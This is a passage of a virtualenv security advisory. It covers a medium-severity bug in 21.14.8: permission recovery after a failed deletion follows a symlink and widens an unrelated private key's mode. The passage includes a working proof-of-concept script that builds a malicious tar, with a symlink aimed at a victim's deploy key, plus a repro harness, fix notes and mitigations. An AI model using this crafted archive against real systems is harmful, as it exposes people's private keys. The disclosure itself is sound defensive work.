    mode_after = stat.S_IMODE(key.stat().st_mode)

    print(f"{label} {archive_name}, `{' '.join(command)}`: exit {result.returncode} {result.stdout.strip()}")
    print(f"{label} {key} mode {mode_before:#o} -> {mode_after:#o}")
    return mode_before, mode_after

control = unpack_next_to_key_and_run_virtualenv("CONTROL ", "home-control", "writable.tar")
default = unpack_next_to_key_and_run_virtualenv("OBSERVED", "home-default", "read-only.tar")
clear = unpack_next_to_key_and_run_virtualenv("OBSERVED", "home-clear", "read-only.tar", "--clear")

# check: the key lives outside the destination; virtualenv has no business changing its mode
print("BUG" if control == (0o400, 0o400) and default == (0o400, 0o777) and clear == (0o400, 0o777) else "OK")
```

**`repro.d/make_project_archive.py`**

```text
#!/usr/bin/env python3
import sys
import tarfile

archive_path = sys.argv[1]
python_folder_mode = int(sys.argv[2], 8)

with tarfile.open(archive_path, "w") as archive:
    python_folder = tarfile.TarInfo("proj/venv/bin/python")
    python_folder.type = tarfile.DIRTYPE
    python_folder.mode = python_folder_mode  # without the write bit, unlinking an entry inside it fails with EACCES
    archive.addfile(python_folder)

    link = tarfile.TarInfo("proj/venv/bin/python/entry")
    link.type = tarfile.SYMTYPE
    link.linkname = "../../../../keys/deploy.pem"  # the victim's key, beside the unpacked proj/
    archive.addfile(link)
```

## Impact

Permission recovery after a failed deletion can change an unrelated target's access bits. This requires the deletion
failure to occur on a link and the invoking user to have permission to change the target mode.

Severity: medium. CVSS 4.5, `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L`, assigned during maintainer review.

## Versions tested

The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected
version or exclude earlier releases. Fixed in 21.14.9.

The fix leaves POSIX modes unchanged when deletion fails. Windows read-only recovery uses a native handle that
opens the entry itself without following reparse points and denies replacement until the attribute update finishes. It
rejects reparse points and clears only the read-only attribute. Concurrent replacement of parent directories remains
outside this protection.

Fix: [PR #3427](https://github.com/pypa/virtualenv/pull/3427).

## Known mitigation

Avoid recursively clearing destinations populated by another account. If cleanup fails, inspect the failing entry before
retrying with broader privileges.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

## Credits

Reported by Anthropic's OSS Scanner as ANT-2026-UK90QC27.
